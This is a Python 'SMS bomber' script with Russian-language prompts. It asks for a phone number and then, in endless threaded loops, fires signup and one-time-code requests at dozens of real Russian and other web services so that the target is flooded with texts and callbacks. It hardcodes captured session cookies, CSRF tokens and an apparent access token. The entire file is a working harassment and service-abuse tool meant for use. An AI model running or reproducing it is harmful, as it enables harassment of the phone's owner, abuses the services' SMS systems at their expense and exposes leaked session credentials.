from termcolor import colored
import requests
import random
from threading import Thread
import time
currT = 1

print('Номер вводить вместе с +')




phone = input('Номер:')
print('Для остановки бомбера закройте программу')
if phone[0:3] == '+79':
  phone2 = newstr = phone.replace("+7", "")
  phone3 = newstr = phone.replace("+7", "7")
  countT = 10;
  r = requests.post('https://www.netprint.ru/order/25',
    data = {
          'operation':'stdreg',
          'dont_use_current_url':'',
          'email_or_phone':phone2,
          'i_agree_with_terms':'1',
          'current_url':'https://www.netprint.ru/order/profile',

    },
    headers = {
      'Host':'www.netprint.ru',
      'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
      'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
      'Referer':'https://www.netprint.ru/order/profile',
      'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With':'XMLHttpRequest',
      'Connection':'keep-alive',
      'Cookie':'unbi=bi5cc9d9a034f98; netPrint2016_user=1; _geolocation=moscow; PHP_SESS_ID=d75b9cdecb89945db1cea102b70bea1b; PHPSESSID=128bc01fc513565e0e5804819ee7110a; homedecor_user_login=NP02_Guest; user_login=NP02_Guest; uguid=9d55fbecff8948c6ad768d8107824407; usergid=28a408015ce0642f7ed85c88f8b3e3d2; _gcl_au=1.1.755795434.1556725107; tracker_ai_user=eZKQI|2019-05-01T1538'})
  r = requests.post('https://rf.petrovich.ru/api/rest/v1/user/pincode/reg',
      data = {
          "phone":phone3
      },
      headers = {
          'Host':'rf.petrovich.ru',
          'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
          'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
          'Referer':'https://rf.petrovich.ru/',
          'Connection':'keep-alive',
          'Cookie':'SNK=122; SIK=dAAAANFWIk4j8_ALXJ4IAA; u__typeDevice=desktop; u__geoCityGuid=d31cf195-2928-11e9-a76e-00259038e9f2; u__geoUserChoose=1; u__cityCode=rf; visid_incap_1871245=wtx6aUcTTu6jvbmmON/P2vbh0lwAAAAAQUIPAAAAAADDJRTSX8m44V0J2bfveTZq; nlbi_1871245=CspcPyrxDnxTN93XANhf/AAAAAB8OTveBN/jtXYmg0w4E6s3; incap_ses_408_1871245=SVgDY9avYjnx9PEOdYOpBfbh0lwAAAAAxqh9+7D0F7kteiGthat4HA==; tgCas=%28not%20set%29; rrpvid=582743792513610; __tld__=null; dd__persistedKeys=[%22user.anonymousId%22%2C%22user.abGroup%22]; dd__lastEventTimestamp=1557317063415; dd_user.anonymousId=685c52d0-7189-11e9-8be4-9963344f883e; dd_user.abGroup=control; rcuid=5cbaedf36a1aa60001f0ed58; tracker_ai_user=mF8p4|2019-05-08T124',
          'TE':'Trailers',
      })
  if r.status_code == 200:
      print("Сообщение от Петровича отправлено")
  else:
      print("Сообщение от Петровича не отправлено")

  if r.status_code == 200:
    print('Одноразовый сервис попытался отправить 1 сообщение')
    header = {'Host':'www.finam.ru','User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0','Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3','Referer':'https://www.finam.ru/about/partnership/','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Cookie':'rheftjdd=rheftjddVal; segmentsUserId=f90526e5-9162-2331-2d7f-4541d0fdddf4; displayResolution=desktop; refreshPage=5; ClientTimezoneOffset=420; ASPSESSIONIDSQABABCQ=NCMIPPABCHDNJBHJFIIPGGEG; segmentsData=puid1=; last_visit=1556742452298','Pragma':'no-cache','Cache-Control':'no-cache'}
    a = random.randint(11111111111, 99999999999)

    r = requests.get('https://www.finam.ru/scripts/smslocker/SMSLockerClient.asp',

        params = {
            'action':'send',
            'guid':'{587DB9AC-925E-4342-9CFD-E'+str(a)+'}',
            'mode':'json',
            'phone':phone},

        headers = header
        )
                         
            

      #print(r.text)
    if r.status_code == 200:
      print("Сообщение от FINAM отправлено")


  r = requests.post('https://en-forme.goods-looks.com/order',
      data = {
          'country':'0',
          'name':'Степан',
          'phone':phone2,
          'product_count':'1',
          'number_product':'3716',
          'split_test_id':'0',
          'split_test':'0',
          'split_test_host':'en-forme.goods-looks.com',
          'fchck':'246301a0af1777728356525ec94252caeda1f93f',
          'ucfi':'0',
          'ts_check':'24bf2f13f1b1454f33f37adc5df1300b'
      },
      headers = {
          'Host':'en-forme.goods-looks.com',
          'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
          'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
          'Referer':'https://en-forme.goods-looks.com/?utm_source=ad1&cid=1012_1562590983&utm_medium=1012_367046&utm_campaign=1869183https',
          'Connection':'keep-alive',
          'Cookie':'_ym_uid=15569613301028583804; _ym_d=1556961330; _ym_isad=2; afCookie=ad1; affiliate_1=1012_1562590983; affiliate_2=1869183https%3A%2F%2Fyandex.ru%2F%3Fclid%3D1923017; affiliate_3=1012_367046; 5428f11fee-2302452898-749dc7dee2-39c189a519=1; 18fa8adca0-227e8efdd3-20ceabe710-d86c7ffcc5=1; PHPSESSID=ba5qiqboljs8sudiod0g7u6nn7; _ym_visorc_22765945=b; formIsSubmitted=true; b9fd7bf12c-a1492e2599-d9a35afe4b-bbe32873a8=1',
          'Upgrade-Insecure-Requests':'1'

      })

def infinity():

  while True:
    if phone[0:3]=='+79':
      cl = requests.session()
      cl.get('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp')
      rMV = requests.post('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp', data = {'phone':phone[2:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80='+cl.cookies['BIGipServeratg-ps-prod_tcp80']+';bIPs='+cl.cookies['bIPs']+';CACHE_INDICATOR='+cl.cookies['CACHE_INDICATOR']+';COMPARISON_INDICATOR='+cl.cookies['COMPARISON_INDICATOR']+';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory='+cl.cookies['flacktory']+';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID'+cl.cookies['JSESSIONID']+';MVID_CITY_ID='+cl.cookies['MVID_CITY_ID']+';MVID_GUEST_ID='+cl.cookies['MVID_GUEST_ID']+';MVID_VIEWED_PRODUCTS='''+';tmr_detect=0|1548089556738;TS0102af22='+cl.cookies['TS0102af22']+';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65='+cl.cookies['TS01189d65']+';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;','Host':'www.mvideo.ru','Referer':'https://www.mvideo.ru/register?sn=false','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
      if rMV.status_code == 200:
                  print(colored('Сообщение от сервиса №1 отправлено!','green'))
      else:
        print(colored('Сообщение от сервиса №1 не отправлено!','red'))
        r = requests.post('https://icq.com/smsreg/requestPhoneValidation.php',
            data = {
                'msisdn':phone3,
                'locale':'ru',
                'countryCode':'ru',
                'k':'ic1rtwz1s1Hj1O0r',
                'version':'1',
                'platform':'web',
                'client':'icq',
                'checks':'sms',
                'r':'22518',

            },
            headers = {
                'Host':' icq.com',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
                'Accept-Language':'ru-RU,ru;q',
                'Referer':'https://web.icq.com/',
                'Content-Type':'application/x-www-form-urlencoded',
                'Origin':'https://web.icq.com',
                'Connection':'keep-alive',

            })
        if r.status_code == 200:
            print("Сообщение от ICQ отправлено")
        else:
            print("Сообщение от ICQ не отправлено")

      r = requests.post('https://youla.ru/web-api/auth/request_code',
          data = {
              'phone':phone3,
          },
          headers = {
              'Content-Type':'application/x-www-form-urlencoded',
          })
      if r.status_code == 512:
          print('Сообщение от Юлы не отправлено')
      else:
          print('Сообщение от Юлы отправлено')
      r = requests.post('https://telephony-main.jivosite.com/api/1/sites/10557/widgets/KxLLXnSFuu/clients/185817/telephony/callback',
          data = {
              'phone':phone3,
          },
          headers = {
              'Content-Type':'application/x-www-form-urlencoded',
          })
      r = requests.post('https://icq.com/smsreg/requestPhoneValidation.php',
          data = {
              'msisdn':phone3,
              'locale':'ru',
              'countryCode':'ru',
              'k':'ic1rtwz1s1Hj1O0r',
              'version':'1',
              'platform':'web',
              'client':'icq',
              'checks':'sms',
              'r':'22518',

          },
          headers = {
              'Host':' icq.com',
              'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
              'Accept-Language':'ru-RU,ru;q',
              'Referer':'https://web.icq.com/',
              'Content-Type':'application/x-www-form-urlencoded',
              'Origin':'https://web.icq.com',
              'Connection':'keep-alive',

          })
      if r.status_code == 200:
          print("Сообщение от ICQ отправлено")
      else:
          print("Сообщение от ICQ не отправлено")
      r = requests.post('https://pizzahut.ru/register',
          data = {
              'gender':'male',
              'first_name':'Киборг',
              'dob-day':'22',
              'dob-month':'8',
              'dob-year':'1337',
              'britnday':'22.08.1337',
              'email':'zxc@mail.com',
              'password':'zxczxczxc',
              'invitation_number':'',
              'phone':phone,
              'sign_mail':'1',
              'sign_loyalty':'1',
              'sign_terms':'1',
              '_token':'YOWsswizkYmeg6buGFYVDwpDgtmiIbS7wy3Uzwx0',
          },
          headers = {
              'Host':' pizzahut.ru',
              'User-Agent':' Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
              'Accept':' */*',
              'Accept-Language':' ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
              'Accept-Encoding':' gzip, deflate, br',
              'Referer':' https//pizzahut.ru/',
              'Content-Type':' application/x-www-form-urlencoded; charset=UTF-8',
              'X-Requested-With':' XMLHttpRequest',
              'Content-Length':'290',
              'Connection':' keep-alive',
              'Cookie':' _ga=GA1.2.380613910.1556625386; _ym_uid=1556625386640802261; _ym_d=1556625386; _fbp=fb.1.1556625386951.370584988; site_server=WWW-VM03; site_version=new; XSRF-TOKEN=eyJpdiI6Ik9hYkt2cWJNQ3A0eUdjcHplcEtua3c9PSIsInZhbHVlIjoiczFiajUwYzJ3ODRKb253aGEyVmRCaGdkRHBMWkFDTmozMjZVRmtFMGpjVjlkY24xNCtpbm4xR3hlMVl5ZFYwSlpsQWxFcThtdzc3RDFOTDVPM1Z4RUE9PSIsIm1hYyI6Ijg0MGMzMzJkYjIyN2FkODYxOWQxZDJjODMzMzdlOTIyYzc2ODU2NDFkNzcyNmJmMmE0ZGM0NGVhMDNkOWFkODAifQ%3D%3D; laravel_session=eyJpdiI6ImJlNU91UHBmNHp0YmYwMFNFdU1VdFE9PSIsInZhbHVlIjoibE4rTUdhTEg0SWNiVDdyc3VwZUlJc2VhYlRkOE5pXC9JRW5GVkZTNXI3aHp3azRPN0ZEMTFYZWRKXC9LS00xaEhFVnNaUEVzTk9FV3RSWkF5aUN4OG4yQT09IiwibWFjIjoiZjcyODM0NDcwMzc3NmMzNzkzNTJmOTgyNDQ5ZDMxOWM3NmMxMGM3NmQyYzY1ZjM3MTAzMDZkZTNjOGVlZWRiOCJ9; _gid=GA1.2.765338054.1557317751; _ym_visorc_37649155=w; _ym_visorc_43532239=w; _ym_isad=2; tmr_detect=0%7C1557317755983',
              'Pragma':' no-cache',
              'Cache-Control':' no-cache',
          })
      if r.status_code == 200:
          print("Сообщение от Пиццы отправлено")
      else:
          print("Сообщение от Пиццы не отправлено")

      rSL = requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {'phone':phone[1:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'_fbp=1548089029383;_ga=GA1.2.1643496723.1548089014;_gat_owox=1;_gat_test=1;_gcl_au=1.1.541266814.1548089013;_gid=GA1.2.339032438.1548089014;_ym_d=1548089016;_ym_isad=2;_ym_uid=1548089016524397773;_ym_visorc_5901091=w;c_medium=referral;c_source=www.google.com;cto_lwid;region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad;region_subdomain=','Host':'api.sunlight.net','Origin':'https://sunlight.net','Referer':'https://sunlight.net/profile/login/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
      if rSL.status_code == 200:
        print(colored('Сообщение от сервиса №2 отправлено!','green'))
      else:
        print(colored('Сообщение от сервиса №2 не отправлено!','red'))
      rFN = requests.post('https://api.fex.net/api/v1/auth/scaffold', data = {'phone':phone[1:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'kepp-alive','Cookie':'_ga=GA1.2.1166716131.1550503357;_gid=GA1.2.807690535.1550503357;alt-register-code=406701;cid=6659361518671092072;G_ENABLED_IDPS=goole;','Host':'api.fex.net','Origin':'https://fex.net','Referer':'https://fex.net/login','TE':'Trailers','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
      if rFN.status_code == 200:
        print(colored('Сообщение от сервиса №3 отправлено!','green'))
      else:
                  print(colored('Сообщение от сервиса №3 не отправлено!','red'))
      rVI = requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})	
      if rVI.status_code == 204:
                  print(colored('Сообщение от сервиса №4 отправлено!','green'))
      else:
                  print(colored('Сообщение от сервиса №4 не отправлено!','red'))
      clDC = requests.session()
      clDC.get('https://www.delivery-club.ru/')
      rDC = requests.post('https://www.delivery-club.ru/ajax/user_otp', data = {'phone':phone[1:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'__sonar=9096940928659092945;__zlcmid=qvi1moOuMZLrn2;_dc_gtm_UA-9598444-2=1;_delivery_menu_fullsize_photo_experiment=1;_delivery_visitor_cookie='+clDC.cookies['_delivery_visitor_cookie']+';_fbp=fb.1.1550525573507.680207634;=_ga=GA1.2.2064764937.1550525569;_gat_UA-9598444-2=1;_gid=GA1.2.609143235.1550525569;advcake_session=1;cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=ca775657-38ee-4429-bdcd-ec1cbcbf526c;dcse=0;FD_ab_group='+clDC.cookies['FD_ab_group']+';flocktory-uuid=a375726b-df59-42a8-9e34-027e98edabdc-6;gdeslon.ru.user_id=1c93ee6e-3a34-46e4-a334-caa05d8d8a24;mr1lad=5c6b24b05b4e8a9d-300-300-;PHPSESSID='+clDC.cookies['PHPSESSID']+';smartbanner-full-shown=true;tmr_detect=0|1550525571650;user_unic_ac_id=af6bbe6e-e6fa-e625-a93f-a7d82c3a9661;visitor_identifier='+clDC.cookies['visitor_identifier']+';','Host':'www.delivery-club.ru','Referer':'https://www.delivery-club.ru/','TE':'Trailers','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRF-Token':'xGO8d6jEwUVpY2GZKeNxUsTRFN5SQj1htcXpxePlc08'})
      if rDC.status_code == 200:
        print(colored('Сообщение от cервиса №5 отправлено!','green'))
      else:
                  print(colored('Сообщение от сервиса №5 не отправлено!','red'))
      clGT = requests.session()
      clGT.get('https://driver.gett.ru/signup/')
      rGT = requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+clGT.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':clGT.cookies['csrftoken']})
      if rGT.status_code == 200:
            print(colored('Сообщение от сервиса №6 отправлено!','green'))
      else:
              print(colored('Сообщение от сервиса №6 не отправлено!','red'))
      clDV = requests.session()
      clDV.get('https://drugvokrug.ru/siteActions/processSms.htm')
      rDV = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone[1:]}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+clDV.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
      if(rDV.status_code == 200):
               print(colored('Сообщение от сервиса №8 отправлено!','green'))
      else:
               print(colored('Сообщение от сервиса №8 не отправлено','red'))
      rUT = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'b.utair.ru','origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
      if(rUT.status_code == 200):
               print(colored('Сообщение от сервиса №9 отправлено!','green'))
      else:
               print(colored('Сообщение от сервиса №9 не отправлено','red'))
      rGRAB = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
      if(rGRAB.status_code == 200):
              print(colored('Сообщение от сервиса №10 отправлено!','green'))
      else:
              print(colored('Сообщение от сервиса №10 не отправлено','red'))

    if phone[0:3] == '+38':
      clDV = requests.session()
      clDV.get('https://drugvokrug.ru/siteActions/processSms.htm')
      rDV = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+clDV.cookies['JSESSIONID']+';','Host':'drugvokrug.ru','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
      if(rDV.status_code == 200):
        print(colored('Сообщение от сервиса №1 отправлено!','green'))
      else:
        print(colored('Сообщение от сервиса №1 не отправлено','red'))
      rVI = requests.post('https://api-production.viasat.ru/api/v1/auth_codes', data = {'msisdn':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru','Connection':'keep-alive','Host':'api-production.viasat.ru','Origin':'https://vipplay.ru','Referer':'https://vipplay.ru/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'}) 
      if(rVI.status_code == 204):
        print(colored('Сообщение от сервиса №2 отправлено!','green'))
      else:
        print(colored('Сообщение от сервиса №2 не отправлено','red'))
      rUT = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'b.utair.ru','origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
      if(rUT.status_code == 200):
        print(colored('Сообщение от сервиса №4 отправлено!','green'))
      else:
        print(colored('Сообщение от сервиса №4 не отправлено','red'))
      rGRAB = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
      if(rGRAB.status_code == 200):
        print(colored('Сообщение от сервиса №5 отправлено!','green'))
      else:
        print(colored('Сообщение от сервиса №5 не отправлено','red'))
      
a = True
def oz():
  while True:
    r = requests.post('https://www.ozon.ru/api/user/v5/account/phone/'+str(phone3)+'/otp',
        headers = {
            'Host':'www.ozon.ru',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
            'Accept':'application/json',
            'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Referer':'https://www.ozon.ru/',
            'Content-Type':'application/json',
            'x-o3-app-name':'ozon_new',
            'X-OZON-ABGROUP':'82',
            'Authorization':'Bearer YtixNS5DIE24BLtyo9nX',
            'Connection':'keep-alive',
            'Cookie':'access_token=YtixNS5DIE24BLtyo9nX; refresh_token=sEH1XDhWVyQI3kjyACgr-HhjqIEei4vaLkzlF-6IYP0kkXajYcjbgL50KLS3Vv-n-0W887Ewg72BLzfgrRZPgPEw4Ue7-oTxf8WrjmMsDUeIXGPgzKDRhf0mgZs_eKaZCH79UBlOBHikbFbVivRzz0VvYplZ5UA5HAA-7FZE5a6clxZBQBYer_5N3Rko8lkDQKDAlXnD92L-uQpI_drnwtmHW-4ZPVbAKgppMbBopIKiNf1p55dW2DkHgX1fQ2bJHe0iJ6Wwdq-b3op6KYOLUq_R_Gto9gjVsJDEi_ygaMS9NvnfvGNB2okCsS-UYI-M6xfNUUzHk_2Xyo5pAaehT27FksZCCrHl3UtAPkzo10R7Av-Tb8VkwmA4LLDsFkzw8SQkriObDPTxaivoVypY1JKMBfnnbhdUYbCeBO4F8QohUUtQYgJb-w; token_expiration="2019-05-08T1720',

        })
    if r.status_code == 201:
        print("Сообщение от Озона отправлено")
    else:
        print("Сообщение от Озона не отправлено")
    time.sleep(60)
    
def mv():
	while True:
		cl = requests.session()
		cl.get('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp')
		newcook = '__SourceTracker=google__organic;_dc_gtm_UA-1873769-1=1;_fbp=1548089553260;_ga=1118344361;_gat_owox37=1;_gcl_au=397168788;_gid=289341971;_ym_d=1547846842;_ym_isad=2;_ym_uid=1547846842874071677;_ym_visorc_25907066=w;_ym_visorc_338158=b;BIGipServeratg-ps-prod_tcp80='+cl.cookies['BIGipServeratg-ps-prod_tcp80']+';bIPs='+cl.cookies['bIPs']+';CACHE_INDICATOR='+cl.cookies['CACHE_INDICATOR']+';COMPARISON_INDICATOR='+cl.cookies['COMPARISON_INDICATOR']+';cto_idcpy=f13ff313-a794-4213-8136-452b7cb46ab8;cto_lwid=c4fb55af-e800-4aa6-a020-7797a2510be0;deviceType=desktop;flacktory='+cl.cookies['flacktory']+';Flocktory_Global_ID=4a848e72-a240-47d3-aaeffa8ae67bdd2b;flocktory-uuid=b8cd369d-ffc6-45cc-9fe9-0e51948ef7c9-8;JSESSIONID'+cl.cookies['JSESSIONID']+';MVID_CITY_ID='+cl.cookies['MVID_CITY_ID']+';MVID_GUEST_ID='+cl.cookies['MVID_GUEST_ID']+';MVID_VIEWED_PRODUCTS='''+';tmr_detect=0|1548089556738;TS0102af22='+cl.cookies['TS0102af22']+';TS0102af22_77=08e3680a10ab28000e39f4bb39e0cf339a7e5f1189c45465b0c27e2b7ed92d9de1494f0bb365d7d804e5e784f65b7d7e083af2c9c08238003acc11662a964627e64bb241d9f9b7f874bc8b75d4b16fb4d42278a017963461daec9960021cce1f17628d24438a180081db36f48e1a81db;TS01189d65='+cl.cookies['TS01189d65']+';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;'
		rMV = requests.post('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp', data = {'phone':phone[2:]}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':newcook,'Host':'www.mvideo.ru','Referer':'https://www.mvideo.ru/register?sn=false','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
		if rMV.status_code == 200:
 			 print('Сообщение от сервиса №1 отправлено!')
		else:
    			print('Сообщение от сервиса №1 не отправлено!')
def az():
  while True:
    
    r = requests.post('https://www.19102018azino777.com/register',
    data = {
        'action':'register',
        'type':'mobile',
        'mobile':phone3,
        'currency':'RUB',
        'is_promo_active':'true',
    },
    headers = {
        'Host':'www.19102018azino777.com',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv66.0) Gecko/20100101 Firefox/66.0',
        'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer':'https://www.19102018azino777.com/?magic_param=5c504db29c8bd&amdp=',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Connection':'keep-alive',

    })
    if r.status_code == 200:
      print('Сообщение от Azino777 отправлено')
    else:
      print('Сообщение от Azino777 не отправлено')
    time.sleep(5)
tM = Thread(target=infinity)
tM.start()
if phone[0:3] == '+79':
  while currT<=countT:
	  t = Thread(target=mv)
	  tt = Thread(target=az)
	  ttt = Thread(target=oz)
	  tt.start()
	  t.start()
	  ttt.start()
	  currT+=1
  
